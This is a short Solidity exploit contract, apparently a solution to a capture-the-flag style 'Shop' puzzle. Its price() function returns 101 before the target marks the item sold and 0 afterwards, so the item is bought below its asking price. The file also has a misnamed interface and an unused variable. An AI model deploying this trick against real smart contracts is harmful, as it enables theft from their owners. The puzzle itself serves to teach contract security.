// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Attack {
    IReentrance target;

    // Змінна для збереження стану
    bool public firstCall = true;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() public {
        target.buy();
    }

    function price() external view returns (uint256) {
        return target.isSold() ? 0 : 101;
    }
}